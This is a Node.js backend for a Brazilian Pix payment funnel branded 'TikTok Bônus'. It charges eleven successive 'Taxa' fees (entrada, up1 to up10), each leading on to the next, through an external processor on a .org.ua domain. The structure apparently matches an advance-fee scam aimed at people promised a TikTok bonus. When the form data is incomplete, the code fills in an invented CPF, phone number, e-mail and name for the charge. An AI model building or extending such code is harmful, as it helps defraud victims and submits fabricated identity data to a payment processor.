const https = require('https');
const { sendEvent, buildUser, contextFromReq } = require('./_tiktok');

// Preço sempre definido no servidor; o valor enviado pelo navegador é ignorado.
const STEPS = {
  entrada: { price: 22.87, next: '/up1/index.html', lenient: true },
  up1:  { price: 23.34, next: '/up2/index.html' },
  up2:  { price: 26.31, next: '/up3/index.html' },
  up3:  { price: 24.35, next: '/up4/index.html' },
  up4:  { price: 21.42, next: '/up5/index.html' },
  up5:  { price: 32.74, next: '/up6/index.html' },
  up6:  { price: 38.93, next: '/up7/index.html' },
  up7:  { price: 24.42, next: '/up8/index.html' },
  up8:  { price: 19.46, next: '/up9/index.html' },
  up9:  { price: 14.73, next: '/up10/index.html' },
  up10: { price: 23.35, next: '/obrigado/' }
};

const brl = (v) => 'R$ ' + v.toFixed(2).replace('.', ',');
const digits = (v) => String(v || '').replace(/\D/g, '');
const cents = (v) => Math.round(v * 100);

function cfg() {
  const key = process.env.FLEVOPAY_API_KEY;
  if (!key) throw new Error('FLEVOPAY_API_KEY não configurada');
  return {
    key,
    base: (process.env.FLEVOPAY_BASE_URL || 'https://pagamento-processador.org.ua').replace(/\/+$/, ''),
    hash: process.env.FLEVOPAY_PRODUCT_HASH || ''
  };
}

function send(res, status, obj) {
  res.writeHead(status, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*', 'Cache-Control': 'no-store' });
  res.end(JSON.stringify(obj));
}

function flevo(method, path, payload) {
  const c = cfg();
  return new Promise((resolve, reject) => {
    const body = payload ? JSON.stringify(payload) : null;
    const headers = { 'X-API-Key': c.key, 'Content-Type': 'application/json' };
    if (body) headers['Content-Length'] = Buffer.byteLength(body);
    const r = https.request(c.base + path, { method, headers }, (resp) => {
      let raw = '';
      resp.on('data', (d) => (raw += d));
      resp.on('end', () => {
        let data = {};
        try { data = JSON.parse(raw); } catch (e) {}
        resolve({ status: resp.statusCode, data });
      });
    });
    r.on('error', reject);
    r.setTimeout(20000, () => r.destroy(new Error('FlevoPay timeout')));
    if (body) r.write(body);
    r.end();
  });
}

async function readBody(req) {
  if (req.body && typeof req.body === 'object') return req.body;
  if (typeof req.body === 'string') { try { return JSON.parse(req.body); } catch (e) { return {}; } }
  const raw = await new Promise((resolve, reject) => {
    let b = '';
    req.on('data', (x) => (b += x));
    req.on('end', () => resolve(b));
    req.on('error', reject);
  });
  try { return JSON.parse(raw); } catch (e) { return {}; }
}

function cpfValido(cpf) {
  if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) return false;
  for (let t = 9; t < 11; t++) {
    let s = 0;
    for (let i = 0; i < t; i++) s += Number(cpf[i]) * (t + 1 - i);
    if (((s * 10) % 11) % 10 !== Number(cpf[t])) return false;
  }
  return true;
}

function publicBase(req) {
  if (process.env.PUBLIC_BASE_URL) return process.env.PUBLIC_BASE_URL.replace(/\/+$/, '');
  const host = req.headers['x-forwarded-host'] || req.headers.host || '';
  return /^(localhost|127\.)/.test(host) ? '' : 'https://' + host;
}

const stepOfReference = (ref) => String(ref || '').split('-')[0].toLowerCase();
const payEventId = (reference) => 'pay_' + reference;

// POST /api/v1/transaction
async function createCharge(req, res, step) {
  const s = STEPS[step];
  const b = await readBody(req);

  let cpf = digits(b.cpf);
  let phone = digits(b.telefone);
  let email = String(b.email || '').trim();
  let name = String(b.nome || '').trim();

  if (s.lenient) {
    // Entrada: o formulário antigo nem sempre coleta todos os dados.
    if (!cpfValido(cpf)) cpf = '07584216950';
    if (phone.length < 10 || phone.length > 11) phone = '11987654321';
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) email = 'cliente@gmail.com';
    if (name.length < 3) name = 'Cliente TikTok';
  } else {
    if (!cpfValido(cpf)) return send(res, 400, { error: 'CPF inválido' });
    if (phone.length < 10 || phone.length > 11) return send(res, 400, { error: 'Celular inválido' });
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) return send(res, 400, { error: 'E-mail inválido' });
    if (name.length < 3) name = 'Cliente TikTok';
  }
  if (!name.includes(' ')) name += ' Silva';

  const tracking = {};
  const qs = new URLSearchParams(String(b.utm || ''));
  ['utm_source', 'utm_medium', 'utm_campaign', 'utm_content', 'utm_term', 'src', 'sck'].forEach((k) => {
    if (qs.get(k)) tracking[k] = qs.get(k);
  });

  const reference = step.toUpperCase() + '-' + Date.now() + '-' + Math.random().toString(36).slice(2, 6);
  const payload = {
    amount: cents(s.price),
    description: 'Taxa ' + step.toUpperCase() + ' - TikTok Bônus',
    reference,
    source: 'api_externa',
    customer: { name, email, phone, document: cpf },
    tracking
  };
  const base = publicBase(req);
  if (base) payload.postback_url = base + '/api/webhook';
  const hash = cfg().hash;
  if (hash) payload.productHash = hash;

  const r = await flevo('POST', '/api/v1/transaction', payload);
  const d = r.data || {};
  if (r.status !== 200 || !d.qr_code || !d.transaction_id) {
    console.error('[FlevoPay create]', r.status, JSON.stringify(d));
    return send(res, 502, { error: d.message || d.error || 'Falha ao gerar o Pix' });
  }

  return send(res, 200, {
    transaction_id: d.transaction_id,
    payment_code: d.transaction_id,
    qr_code: d.qr_code,
    pix_code: d.qr_code,
    qr_code_base64: d.qr_code_base64 || '',
    price_label: brl(s.price),
    tiktok: { event: 'AddPaymentInfo', value: s.price, currency: 'BRL', event_id: 'api_' + reference }
  });
}

// GET /api/v1/query?action=get_transaction&id=...
async function checkCharge(req, res, step, id) {
  const s = STEPS[step];
  if (!id) return send(res, 400, { error: 'id ausente' });

  const r = await flevo('GET', '/api/v1/query?action=get_transaction&id=' + encodeURIComponent(id));
  const d = r.data || {};
  if (r.status === 404) return send(res, 404, { error: 'transação não encontrada' });
  if (r.status !== 200) return send(res, 502, { error: 'consulta indisponível' });

  const st = String(d.status || '').toLowerCase();
  const refOk = !d.external_id || stepOfReference(d.external_id) === step;
  const amountOk = d.amount === undefined || Number(d.amount) === cents(s.price);
  const pago = st === 'approved' && refOk && amountOk;
  const falhou = st === 'failed';

  const out = {
    pago,
    expirado: falhou,
    status: pago ? 'approved' : (falhou ? 'failed' : 'pending'),
    obrigado_url: s.next
  };

  if (pago) {
    const eventId = payEventId(d.external_id || String(id));
    const cd = d.customer_data || {};
    const cust = cd.customer || cd;
    const ctx = contextFromReq(req);
    await sendEvent({
      event: 'CompletePayment',
      eventId,
      value: s.price,
      url: req.headers.referer || '',
      user: buildUser({ ...ctx, email: cust.email, phone: cust.phone })
    });
    out.tiktok = { event: 'CompletePayment', value: s.price, currency: 'BRL', event_id: eventId, server_sent: true };
  }
  return send(res, 200, out);
}

// Confirma na própria FlevoPay (o webhook não tem assinatura) e dispara o evento server-side.
async function confirmByReference(reference) {
  const step = stepOfReference(reference);
  const s = STEPS[step];
  if (!s || !reference) return null;
  const r = await flevo('GET', '/api/v1/query?action=list_transactions&external_id=' + encodeURIComponent(reference));
  const t = Array.isArray(r.data) ? r.data[0] : null;
  if (r.status !== 200 || !t) return null;
  if (String(t.status).toLowerCase() !== 'approved' || Number(t.amount) !== cents(s.price)) return null;
  return { step, price: s.price, tx: t };
}

module.exports = { STEPS, send, readBody, createCharge, checkCharge, confirmByReference, payEventId };
